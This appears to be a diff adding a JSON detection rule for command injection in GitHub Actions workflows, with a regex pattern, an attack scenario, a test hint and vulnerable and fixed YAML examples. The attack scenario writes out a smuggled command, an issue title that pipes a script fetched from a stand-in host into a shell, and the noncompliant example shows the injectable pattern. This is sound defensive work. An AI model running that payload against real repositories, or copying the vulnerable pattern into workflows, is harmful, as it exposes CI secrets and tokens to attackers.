@@ -1,0 +1,23 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "GitHub Actions run-command injection via untrusted event input",
+  "owasp": ["A05"],
+  "rank": 0,
+  "kev": false,
+  "severity": "critical",
+  "task_triggers": ["github actions", "workflow", "ci", "run:", "github.event", "actions", "pipeline"],
+  "patterns": [
+    {
+      "lang": "yaml",
+      "confidence": "high",
+      "re": "\\brun:\\s*[^\\n]*\\$\\{\\{\\s*github\\.event\\.(?:issue|pull_request|comment|review|commits|head_commit|client_payload|pages)\\b"
+    }
+  ],
+  "attack_scenario": "an attacker opens an issue or PR titled `$(curl evil.sh | sh)`; the workflow interpolates it directly into a run: command and the CI runner executes it with the repo's secrets and GITHUB_TOKEN",
+  "negative_test_hint": ["open a test issue titled \"$(touch /tmp/pwned)\" and assert the workflow logs it as inert text instead of executing it"],
+  "exemplar": {
+    "noncompliant": "- run: echo \"${{ github.event.issue.title }}\"",
+    "compliant": "- env:\n    TITLE: ${{ github.event.issue.title }}\n  run: echo \"$TITLE\"",
+    "explanation": "Untrusted github.event.* fields interpolated into run: execute on the runner with CI secrets. Route the value through an env: binding and quote it so it is passed as data, never parsed as shell."
+  }
+}
